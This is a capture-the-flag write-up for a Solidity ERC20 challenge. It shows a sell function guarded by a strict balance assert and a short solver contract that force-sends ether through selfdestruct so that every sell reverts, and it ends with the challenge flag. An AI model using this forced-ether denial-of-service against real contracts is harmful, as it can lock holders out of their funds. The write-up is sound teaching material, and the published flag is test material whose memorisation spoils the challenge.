# Challenge 01 : Classic one tbh [17 solves] [489 points] [First blood 🩸]

```
ERC20, bad guy has money in it, prevent him from getting his money back. 
This is a standalone ERC20, not available on a swap.
Block all the sells to get the flag
```

Our goal is to block the sell function 

```solidity
    function sell(uint256 _amount) external {
        require(userBalances[msg.sender] >= _amount, "Insufficient balance");

        userBalances[msg.sender] -= _amount;
        totalSupply -= _amount;

        (bool success, ) = msg.sender.call{value: _amount * TOKEN_PRICE}("");
        require(success, "Failed to send Ether");

        assert(getEtherBalance() == totalSupply * TOKEN_PRICE);
    }
```

It will revert when getEtherBalance() does not equal to totalSupply * TOKEN_PRICE, so we can just send ether to it to make it revert

```solidity
pragma solidity ^0.8.0;

contract chall1_solve {
    constructor(address chall1) public payable {
        selfdestruct(payable(chall1));
    }
}
```

Just deploy this contract and send 1 wei to it, then it will send 1 wei to the challenge contract

Flag :
```
Hero{S4m3_aS_USU4L_bUT_S3eN_IRL??!}
```